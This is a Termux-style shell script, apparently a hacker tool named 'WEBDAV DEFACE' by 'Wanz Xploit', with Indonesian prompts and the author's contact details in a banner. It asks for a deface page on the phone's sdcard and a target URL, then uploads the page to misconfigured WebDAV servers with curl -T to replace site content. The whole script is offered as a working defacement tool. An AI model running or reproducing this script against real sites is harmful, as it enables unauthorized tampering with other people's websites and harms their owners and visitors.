clear
clear
cd /sdcard
figlet -f pagga WEBDAV DEFACE 
echo""
echo "  _____________________"
echo " /                    /""|" " contacts:0881037302039"
echo "/____________________/"" |" " ========================"
echo "|""Author: Wanz Xploit" "|" "|" " Me:venomreyy@gmail.com"
echo "|====================|"" |" " ========================"
echo "|""DRAGONS HUNTER""|"" |" "        FB: Redi Awan "
echo "|________| °| °|_______|""/" " ========================"
echo ""
echo "              [""-""]""TOOLS WEBDAV""[""-""]"
echo ""
echo "*note:"
echo "|========================================|"
echo "|""Script Deface Harus Di letakan di Sdcard""|"
echo "|""Dan Jangan Di Masukan Ke Folder Apapun"   "|"
echo "|========================================|"
echo ""
echo -n "Nama Script Deface?:" 
read sc
echo ""
trap ctrl_c INT
ctrl_c() {
clear
echo $"CTRL+C DetectedðŸ˜¢, Trying To Exit" 
echo ""
echo $" Byee,see you Saiang ðŸ˜—" 
sleep 1
exit
}
lagi=1
while [ $lagi -lt 6 ];
do
echo "[""1""]" "Masukan Target";
echo ""
read -p "wanzxploit@root# " pil;
case $pil in
1)echo -n "Masukan Target:" 
read tg
echo ""
echo -n "Target $tg !" "Tekan Enter Untuk Tusbol.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo "======================================================================"
echo "Silakan Di Cek: $tg/$sc"
echo "======================================================================"
exit
;;
*) echo " CARI YANG ADA AJA TOD " 
esac
done
done
